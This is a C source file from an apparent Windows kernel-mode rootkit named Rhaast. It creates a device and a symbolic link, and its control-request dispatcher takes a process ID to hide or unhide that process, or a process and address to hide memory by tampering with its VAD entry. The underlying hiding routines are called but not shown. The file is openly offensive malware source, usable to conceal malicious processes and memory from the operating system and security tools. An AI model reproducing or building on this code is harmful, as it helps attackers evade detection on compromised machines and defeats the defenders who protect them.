#include <Rhaast.h>

/**
 * @brief
 *      used to handle IRP_MJ_CREATE/IRP_MJ_CLOSE requests
 */
NTSTATUS TsIoCtlCreateClose(
    IN OUT PDEVICE_OBJECT DriverObject, 
    IN OUT PIRP           Irp
) {
    Irp->IoStatus.Status      = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;

    PUTS( "open/close request has been made" )

    IofCompleteRequest( Irp, IO_NO_INCREMENT );

    return STATUS_SUCCESS;
}

/**
 * @brief
 *      initialize IoCtl transport functions
 *      and create I/O Device & symbol link
 *
 * @return
 *      NtStatus of function and it's operations
 */
NTSTATUS TsIoCtlInit(
    VOID
) {
    UNICODE_STRING DeviceName = RTL_CONSTANT_STRING( RHAAST_DEVICE_NAME );
    UNICODE_STRING SymbolLink = RTL_CONSTANT_STRING( RHAAST_SYMBOL_LINK );
    NTSTATUS       NtStatus   = STATUS_SUCCESS;

    /* set pointers */
    Instance.DriverObject->MajorFunction[ IRP_MJ_CREATE ]         = 
    Instance.DriverObject->MajorFunction[ IRP_MJ_CLOSE  ]         = TsIoCtlCreateClose;
    Instance.DriverObject->MajorFunction[ IRP_MJ_DEVICE_CONTROL ] = TsIoCtlDispatch;

    /* create I/O Device */
    if ( ! NT_SUCCESS( NtStatus = IoCreateDevice( Instance.DriverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &Instance.DeviceObject ) ) ) {
        PRINTF( "IoCreateDevice Failed: %p\n", NtStatus )
        goto FAILED;
    }

    /* create symbol link */
    if ( ! NT_SUCCESS( NtStatus = IoCreateSymbolicLink( &SymbolLink, &DeviceName ) ) ) {
        PRINTF( "IoCreateSymbolicLink Failed: %p\n", NtStatus )
        goto FAILED;
    }

    /* we successful executed the function */
    return STATUS_SUCCESS;

FAILED:
    if ( Instance.DeviceObject ) {
        IoDeleteDevice( Instance.DeviceObject );
        Instance.DeviceObject = NULL;
    }

    return NtStatus;
}

/**
 * @brief
 *      Responsible for handling & dispatch IOCTLs 
 *      and returning output to the user.
 *
 * @param DeviceObject
 *      Not used
 *
 * @param Irp
 *      Irp contains the data issued by the client
 *
 * @return
 *      if the function succeeded to execute
 */
NTSTATUS TsIoCtlDispatch(
    IN OUT PDEVICE_OBJECT DeviceObject,
    IN OUT PIRP           Irp
) {
    PIO_STACK_LOCATION IrpStack = NULL;
    NTSTATUS           NtStatus = STATUS_SUCCESS;

    /* get current irp stack */
    IrpStack = IoGetCurrentIrpStackLocation( Irp ); 

    /* dispatch IOCTL code */
    switch ( IrpStack->Parameters.DeviceIoControl.IoControlCode ) {

        case RHAAST_IOCTL_PROCESS_HIDE: PUTS( "RHAAST_IOCTL_PROCESS_HIDE" )
        {
            ULONG Pid = 0;

            /* check if param has been specified */
            if ( ! Irp->AssociatedIrp.SystemBuffer ) {
                NtStatus = STATUS_INVALID_PARAMETER;
                break;
            }

            /* check data input size */
            if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( ULONG ) ) {
                NtStatus = STATUS_INVALID_BUFFER_SIZE;
                break;
            }

            /* get process id & hide process */
            if ( Irp->AssociatedIrp.SystemBuffer ) {
                Pid = * ( PULONG ) Irp->AssociatedIrp.SystemBuffer;

                /* hide process */
                if ( ! NT_SUCCESS( NtStatus = ProcessHide( Pid ) ) ) {
                    PRINTF( "Failed to hide process: %p\n", NtStatus )
                    break;
                }
                
                PRINTF( "Process Hidden: %d\n", Pid )
            } else {
                NtStatus = STATUS_INVALID_PARAMETER;
            }

            break;
        }

        case RHAAST_IOCTL_PROCESS_UNHIDE: PUTS( "RHAAST_IOCTL_PROCESS_UNHIDE" )
        {
            ULONG Pid = 0;

            /* check if param has been specified */
            if ( ! Irp->AssociatedIrp.SystemBuffer ) {
                NtStatus = STATUS_INVALID_PARAMETER;
                break;
            }

            /* check data input size */
            if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( ULONG ) ) {
                NtStatus = STATUS_INVALID_BUFFER_SIZE;
                break;
            }

            /* get process id & unhide process */
            if ( Irp->AssociatedIrp.SystemBuffer ) {
                Pid = * ( PULONG ) Irp->AssociatedIrp.SystemBuffer;

                /* unhide process */
                if ( ! NT_SUCCESS( NtStatus = ProcessUnHide( Pid ) ) ) {
                    PRINTF( "Failed to unhide process: %p\n", NtStatus )
                    break;
                }
                
                PRINTF( "Process UnHidden: %d\n", Pid )
            } else {
                NtStatus = STATUS_INVALID_PARAMETER;
            }

            break;
        }

        case RHAAST_IOCTL_MEMORY_VAD: PUTS( "RHAAST_IOCTL_MEMORY_VAD" )
        {
            PRS_C_MEMORY_VAD MemoryVad = NULL;

            /* check if param has been specified */
            if ( ! Irp->AssociatedIrp.SystemBuffer ) {
                NtStatus = STATUS_INVALID_PARAMETER;
                break;
            }

            /* check data input size */
            if ( IrpStack->Parameters.DeviceIoControl.InputBufferLength < sizeof( RS_C_MEMORY_VAD ) ) {
                NtStatus = STATUS_INVALID_BUFFER_SIZE;
                break;
            }

            MemoryVad = Irp->AssociatedIrp.SystemBuffer;

            if ( MemoryVad->Hide ) 
            {
                /* hide memory by manipulating the VAD entry of virtual address */
                if ( ! NT_SUCCESS( NtStatus = MemoryVadHide( MemoryVad->Pid, MemoryVad->Address ) ) ) {
                    PRINTF( "Failed to hide VAD: Pid:[%ld] Address:[%p] Status:[%p]\n", MemoryVad->Pid, MemoryVad->Address, NtStatus )
                    break; 
                }
            } else {
                // MemoryVadUnHide( MemoryVad->Pid, MemoryVad->Address );
            }

            break;
        }

        default: {
            NtStatus = STATUS_INVALID_PARAMETER;
        }
    }

    return NtStatus;
}
